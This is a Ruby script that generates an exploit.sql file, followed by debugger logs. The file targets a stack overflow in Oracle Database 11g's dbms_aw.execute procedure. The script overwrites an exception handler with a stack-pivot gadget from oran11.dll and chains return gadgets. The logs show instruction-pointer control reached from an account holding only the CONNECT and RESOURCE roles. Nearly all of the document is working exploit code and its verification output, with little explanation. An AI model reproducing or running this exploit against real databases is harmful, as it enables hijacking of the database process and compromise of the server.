#!/usr/bin/env ruby

require 'rex'

flip =   [0x102907c8].pack('V') # oran11.dll
# 0:035> u 0x102907c8
# oran11!ztvulp+0xd325c:
# 102907c8 81c490000000    add     esp,90h
# 102907ce 5b              pop     ebx
# 102907cf 5d              pop     ebp
# 102907d0 c3              ret
ropnop = [0x10290f21].pack('V') * 24 # oran11.dll

data = Rex::Text.pattern_create(2024)
data[1044, flip.size]   = flip.force_encoding("ASCII-8BIT")
data[1200, ropnop.size] = ropnop.force_encoding("ASCII-8BIT")

sql = "exec dbms_aw.execute('cda #{data}');"

fd = File.new("exploit.sql", "wb")
fd.write(sql)
fd.close
__END__
SQL> @@C:\Users\mc\Desktop\exploit.sql
/////
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00008fb0 ebx=42344942 ecx=29baa4c4 edx=00000000 esi=49423549 edi=33494232
eip=41414141 esp=29baa8dc ebp=37494236 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
0:033> !exchain
29baaa88: 58423358
Invalid exception stack at 42325842
0:033> !load msec
0:033> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Read Access Violation at the Instruction Pointer starting at Unknown Symbol @ 0x0000000041414141 called from Unknown Symbol @ 0x0000000042325242 (Hash=0x264d5172.0x00000000)

Access violations at the instruction pointer are exploitable if not near NULL.
0:033> d esp
29baa8dc  49 39 42 4a 30 42 4a 31-42 4a 32 42 4a 33 42 4a  I9BJ0BJ1BJ2BJ3BJ
29baa8ec  34 42 4a 35 42 4a 36 42-4a 37 42 4a 38 42 4a 39  4BJ5BJ6BJ7BJ8BJ9
29baa8fc  42 4b 30 42 4b 31 42 4b-32 42 4b 33 42 4b 34 42  BK0BK1BK2BK3BK4B
29baa90c  4b 35 42 4b 36 42 4b 37-42 4b 38 42 4b 39 42 4c  K5BK6BK7BK8BK9BL
29baa91c  30 42 4c 31 42 4c 32 42-4c 33 42 4c 34 42 4c 35  0BL1BL2BL3BL4BL5
29baa92c  42 4c 36 42 4c 37 42 4c-38 42 4c 39 42 4d 30 42  BL6BL7BL8BL9BM0B
29baa93c  4d 31 42 4d 32 42 4d 33-42 4d 34 42 4d 35 42 4d  M1BM2BM3BM4BM5BM
29baa94c  36 42 4d 37 42 4d 38 42-4d 39 42 4e 30 42 4e 31  6BM7BM8BM9BN0BN1

/////

SQL> select * from v$version;

BANNER
--------------------------------------------------------------------------------

Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - Production
PL/SQL Release 11.2.0.1.0 - Production
CORE    11.2.0.1.0      Production
TNS for 32-bit Windows: Version 11.2.0.1.0 - Production
NLSRTL Version 11.2.0.1.0 - Production

///////
SQL> describe dbms_aw.execute;

PROCEDURE EXECUTE
 Argument Name                  Type                    In/Out Default?
 ------------------------------ ----------------------- ------ --------
 CMD                            VARCHAR2                IN

////

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO

SQL> select * from user_tab_privs;

no rows selected

SQL> select * from user_sys_privs;

USERNAME                       PRIVILEGE                                ADM
------------------------------ ---------------------------------------- ---
SCOTT                          UNLIMITED TABLESPACE                     NO
SCOTT                          CREATE SESSION                           NO
////

Breakpoint 0 hit
eax=00008fb0 ebx=42344942 ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=102907c8 esp=0f7ca8dc ebp=37494236 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
oran11!ztvulp+0xd325c:
102907c8 81c490000000    add     esp,90h
0:033> p
eax=00008fb0 ebx=42344942 ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=102907ce esp=0f7ca96c ebp=37494236 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
oran11!ztvulp+0xd3262:
102907ce 5b              pop     ebx
0:033> p
eax=00008fb0 ebx=4e42374e ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=102907cf esp=0f7ca970 ebp=37494236 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
oran11!ztvulp+0xd3263:
102907cf 5d              pop     ebp
0:033> p
eax=00008fb0 ebx=4e42374e ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=102907d0 esp=0f7ca974 ebp=394e4238 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
oran11!ztvulp+0xd3264:
102907d0 c3              ret
--- here we hit our rop nops ---
0:033> p
eax=00008fb0 ebx=4e42374e ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=10290f21 esp=0f7ca978 ebp=394e4238 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
oran11!ztvulp+0xd39b5:
10290f21 c3              ret
0:033> p
eax=00008fb0 ebx=4e42374e ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=10290f21 esp=0f7ca97c ebp=394e4238 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
oran11!ztvulp+0xd39b5:
10290f21 c3              ret
0:033> p
eax=00008fb0 ebx=4e42374e ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=10290f21 esp=0f7ca980 ebp=394e4238 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
oran11!ztvulp+0xd39b5:
10290f21 c3              ret
0:033> p
eax=00008fb0 ebx=4e42374e ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=10290f21 esp=0f7ca984 ebp=394e4238 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
oran11!ztvulp+0xd39b5:
10290f21 c3              ret
0:033> p
eax=00008fb0 ebx=4e42374e ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=10290f21 esp=0f7ca988 ebp=394e4238 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
oran11!ztvulp+0xd39b5:
10290f21 c3              ret
0:033> p
eax=00008fb0 ebx=4e42374e ecx=0f7ca4c4 edx=00000000 esi=49423549 edi=33494232
eip=42325242 esp=0f7ca9d8 ebp=394e4238 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
42325242 ??              ???
0:033> d esp
0f7ca9d8  52 33 42 52 34 42 52 35-42 52 36 42 52 37 42 52  R3BR4BR5BR6BR7BR
0f7ca9e8  38 42 52 39 42 53 30 42-53 31 42 53 32 42 53 33  8BR9BS0BS1BS2BS3
0f7ca9f8  42 53 34 42 53 35 42 53-36 42 53 37 42 53 38 42  BS4BS5BS6BS7BS8B
0f7caa08  53 39 42 54 30 42 54 31-42 54 32 42 54 33 42 54  S9BT0BT1BT2BT3BT
0f7caa18  34 42 54 35 42 54 36 42-54 37 42 54 38 42 54 39  4BT5BT6BT7BT8BT9
0f7caa28  42 55 30 42 55 31 42 55-32 42 55 33 42 55 34 42  BU0BU1BU2BU3BU4B
0f7caa38  55 35 42 55 36 42 55 37-42 55 38 42 55 39 42 56  U5BU6BU7BU8BU9BV
0f7caa48  30 42 56 31 42 56 32 42-56 33 42 56 34 42 56 35  0BV1BV2BV3BV4BV5

